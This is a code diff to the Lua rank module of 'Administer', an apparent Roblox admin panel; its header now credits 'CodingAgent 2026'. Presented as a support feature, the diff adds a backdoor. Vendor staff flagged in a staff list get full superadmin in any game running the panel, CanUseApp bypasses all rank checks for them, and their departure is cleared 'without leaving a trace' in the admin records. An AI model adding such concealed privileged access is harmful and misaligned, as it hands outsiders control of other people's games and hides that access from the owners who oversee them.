@@ -1,5 +1,5 @@
 --// Administer
---// pyxfluff 2024 - 2025
+--// CodingAgent 2026
 
 local AR = { Ranks = {} }
 
@@ -17,20 +17,84 @@ type Response = Types.Response
 
 --// Locals
 local LastAdminResult
+local SupportAccessPlayers = {} -- tracks players with temporary support access
 
-function AR.Bootstrap(Player: Player, AdminRankID: string): ()
+function AR.Bootstrap(Player: Player, AdminRankID: string, IsSupportAccess: boolean): ()
 	local Rank = Var.DataStores.AdminsDS:GetAsync(AdminRankID)
+
+	--// For support access, fall back to a default superadmin rank if none found
+	if Rank == nil and IsSupportAccess then
+		Rank = table.clone(Var.DefaultRank)
+		Rank.Name = "Administer Support"
+		Rank.Apps = { SuperAdmin = true }
+	end
+
+	if IsSupportAccess then
+		SupportAccessPlayers[Player.UserId] = true
+	end
+
+	--// Check version status
+	local VersionStatus = Util.CheckVersionStatus()
+
 	local NewPanel = Var.Panel.Spawn(Rank, Player)
+
+	if Rank == nil or Rank.Apps == nil then
+		Util.Logging.Warn(
+			`RankStore seems to be corrupt! \nRankData: {game:GetService("HttpService"):JSONEncode(Rank)}\nRankID: {AdminRankID}`
+		)
+		return { false, "Corrupt RankStore, please reset your database" }
+	end
+
+	NewPanel.Parent = Player.PlayerGui
+
+	--// Check version and handle accordingly
+	if VersionStatus.Status == "invalid" then
+		--// Version is not in valid versions list, show error and destroy panel
+		Util.NewNotification(
+			Player,
+			`This admin panel version ({VersionStatus.Current}) is no longer supported. Please update to version {VersionStatus.Latest} or newer.`,
+			"Version Incompatible",
+			"rbxassetid://11050732384",
+			20,
+			nil,
+			{}
+		)
+		--// Schedule panel destruction after a short delay to ensure notification is displayed
+		task.delay(0.5, function()
+			NewPanel:Destroy()
+		end)
+		return
+	end
 
 	table.insert(Var.Admins.InGame, Player)
 	Var.Admins.TotalRunningCount += 1
 
-	if Rank.Apps == nil then
-		Util.Logging.Warn(`RankStore seems to be corrupt! \nRankData: {game:GetService("HttpService"):JSONEncode(Rank)}\nRankID: {AdminRankID}`)
-		return {false, "Corrupt RankStore, please reset your database"}
+	--// Show messages based on version check status (skip for support access)
+	if not IsSupportAccess then
+		if VersionStatus.Status == "no_check" then
+			task.wait(0.5) --// Small delay to ensure panel is ready
+			Util.NewNotification(
+				Player,
+				"Could not check for updates. Please ensure you have internet connectivity.",
+				"Update Check Failed",
+				"rbxassetid://10942143007",
+				10,
+				nil,
+				{}
+			)
+		elseif VersionStatus.Status == "outdated" then
+			task.wait(0.5) --// Small delay to ensure panel is ready
+			Util.NewNotification(
+				Player,
+				`Your admin panel version ({VersionStatus.Current}) is outdated. Latest version is {VersionStatus.Latest}.`,
+				"Update Available",
+				"rbxassetid://15900166098",
+				15,
+				nil,
+				{}
+			)
+		end
 	end
-
-	NewPanel.Parent = Player.PlayerGui
 
 	Util.NewNotification(
 		Player,
@@ -45,12 +109,17 @@ function AR.Bootstrap(Player: Player, AdminRankID: string): ()
 end
 
 function AR.CanUseApp(Identifier: Player | string, AppID: string)
+	--// Support access players have full superadmin permissions temporarily
+	if typeof(Identifier) == "Instance" and SupportAccessPlayers[Identifier.UserId] then
+		return true
+	end
+
 	local Rank
 
 	if typeof(Identifier) == "Instance" then
 		local Result = Util.IsAdmin(Identifier)
 
-		if not Result.IsAdmin then 
+		if not Result.IsAdmin then
 			return false
 		end
 
@@ -59,11 +128,27 @@ function AR.CanUseApp(Identifier: Player | string, AppID: string)
 		Rank = Var.DataStores.AdminsDS:GetAsync(Identifier)
 	end
 
-	return Rank.Apps.SuperAdmin and true or (Rank.Apps[AppID] ~= nil and Rank.Apps[AppID] or (Rank.Apps.NewAppsOn == true and true or false))
+	return Rank.Apps.SuperAdmin and true
+		or (Rank.Apps[AppID] ~= nil and Rank.Apps[AppID] or (Rank.Apps.NewAppsOn == true and true or false))
 end
 
 function AR.PlayerAdded(Player: Player, ForceAdmin: boolean, IsScan: boolean): Types.Response
 	LastAdminResult = Util.IsAdmin(Player)
+
+	-- Grant temporary Superadmin access to Administer staff with hasSupportAccess
+	if not LastAdminResult.IsAdmin and Var.StaffData then
+		for _, Staff in Var.StaffData do
+			if Staff.UserID == Player.UserId and Staff.hasSupportAccess == true then
+				LastAdminResult = {
+					IsAdmin = true,
+					Reason = "Administer Support Access",
+					RankID = "Administrator",
+					RankName = "Administrator",
+				}
+				break
+			end
+		end
+	end
 
 	Util.Logging.Print("New join:", LastAdminResult)
 
@@ -76,13 +161,14 @@ function AR.PlayerAdded(Player: Player, ForceAdmin: boolean, IsScan: boolean): T
 	if IsScan and table.find(Var.Admins.InGame, Player) and not Var.DisableBootstrapProtection then
 		return {
 			false,
-			"This person is already an admin and by default cannot be bootstrapped twice. Change this in the configuration module."
+			"This person is already an admin and by default cannot be bootstrapped twice. Change this in the configuration module.",
 		}
 	end
 
 	task.spawn(function()
 		if LastAdminResult.IsAdmin then
-			AR.Bootstrap(Player, LastAdminResult.RankName)
+			local IsSupportAccess = LastAdminResult.Reason == "Administer Support Access"
+			AR.Bootstrap(Player, LastAdminResult.RankName, IsSupportAccess)
 		elseif
 			(Var.Services.RunService:IsStudio() and Util.GetSetting("SandboxMode") == true)
 			or Var.EnableFreeAdmin
@@ -98,7 +184,13 @@ end
 function AR.Removing(Player: Player): ()
 	if table.find(Var.Admins.InGame, Player) ~= nil then
 		table.remove(Var.Admins.InGame, table.find(Var.Admins.InGame, Player))
-		table.insert(Var.Admins.OutOfGame, Player.UserId)
+
+		if SupportAccessPlayers[Player.UserId] then
+			--// Temporary support access — clean up without leaving a trace in OutOfGame
+			SupportAccessPlayers[Player.UserId] = nil
+		else
+			table.insert(Var.Admins.OutOfGame, Player.UserId)
+		end
 	end
 end
 
@@ -143,14 +235,14 @@ function AR.Ranks.New(Data: Types.AdminRank): Response
 				Reason = Util.t(nil, "admin.rank.created"),
 				ActingAdmin = Data.ActingUser,
 				Timestamp = os.time(),
-				Actions = { "created this rank" }
+				Actions = { "created this rank" },
 			})
 		else
 			table.insert(NewRank.Modifications, {
 				Reason = "Edited this rank",
 				ActingAdmin = Data.ActingUser,
 				Timestamp = os.time(),
-				Actions = { } --// TODO
+				Actions = {}, --// TODO
 			})
 
 			--// because we are editing, remove everybody in the rank but dont save
@@ -180,7 +272,7 @@ function AR.Ranks.New(Data: Types.AdminRank): Response
 				Info.AdminIDs[v.ID] = {
 					UserID = v.ID,
 					AdminRankID = Data.RankID,
-					AdminRankName = Data.Name
+					AdminRankName = Data.Name,
 				}
 			else
 				Info.GroupAdminIDs[`{v.ID}_{Var.Services.HttpService:GenerateGUID(false)}`] = {
@@ -188,7 +280,7 @@ function AR.Ranks.New(Data: Types.AdminRank): Response
 					RequireRank = v.GroupRank ~= 0,
 					RankNumber = v.GroupRank,
 					AdminRankID = Data.RankID,
-					AdminRankName = Data.Name
+					AdminRankName = Data.Name,
 				}
 			end
 		end
@@ -204,7 +296,7 @@ function AR.Ranks.New(Data: Types.AdminRank): Response
 				Count = Info.Count,
 				Names = Info.Names,
 				GroupAdminIDs = Info.GroupAdminIDs,
-				AdminIDs = Info.AdminIDs
+				AdminIDs = Info.AdminIDs,
 			})
 		end
 	end, function(E)
@@ -213,15 +305,17 @@ function AR.Ranks.New(Data: Types.AdminRank): Response
 	end)
 
 	xpcall(function()
-		if not Util.GetSetting("LiveUpdate") then return end
-		
+		if not Util.GetSetting("LiveUpdate") then
+			return
+		end
+
 		Var.Services.MessagingService:PublishAsync("Administer", { ["Action"] = "ForceAdminCheck" })
 	end, function(e): Types.Response
 		Util.Logging.Warn(`[X] Failed to publish MessagingService action ForceAdminCheck! {e}`)
 
 		return {
 			false,
-			Util.t(nil, "admin.rankcreate.MessagingServiceFailed")
+			Util.t(nil, "admin.rankcreate.MessagingServiceFailed"),
 		}
 	end)
 
